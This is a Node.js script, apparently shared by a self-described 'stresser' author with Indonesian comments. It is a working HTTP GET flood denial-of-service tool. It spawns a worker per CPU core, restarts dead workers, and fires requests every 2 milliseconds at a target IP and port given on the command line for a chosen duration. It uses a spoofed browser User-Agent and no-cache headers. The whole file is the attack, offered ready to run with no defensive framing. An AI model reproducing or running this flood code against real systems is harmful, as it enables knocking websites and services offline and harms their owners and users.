//Method By STEVEN•STRESSER🕊🪽
//Jangan Dihapus Yang Hapus Saya Sumpah Jadi Yatim
const http = require('http');
const cluster = require('cluster');
const os = require('os');

if (cluster.isMaster) {
    console.log(`Master Process Is Running`);

    // Buat Worker Sebanyak Jumlah CPU Yang Tersedia
    for (let i = 0; i < os.cpus().length; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} Died`);
        cluster.fork(); // Fork Worker Baru Kalau Ada Yang Mati
    });

} else {
    const targetIP = process.argv[2];
    const targetPort = process.argv[3];
    const duration = process.argv[4] * 1000;
    const startTime = Date.now();

    const flood = () => {
        const options = {
            hostname: targetIP,
            port: targetPort,
            path: '/',
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/58.0.3029.110 Safari/537.36',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
        };

        const req = http.request(options, res => {
            res.on('data', () => {});
            res.on('end', () => {});
        });

        req.on('error', error => {});
        req.end();

        if (Date.now() - startTime > duration) {
            console.log(`Worker ${process.pid} Finished Attacking`);
            process.exit(0);
        }
    };

    console.log(`Worker ${process.pid} Started Attacking`);
    
    // Set Interval Yang Lebih Intensif
    const interval = setInterval(flood, 2); // 2Ms Interval Untuk Serangan Lebih Agresif
} 
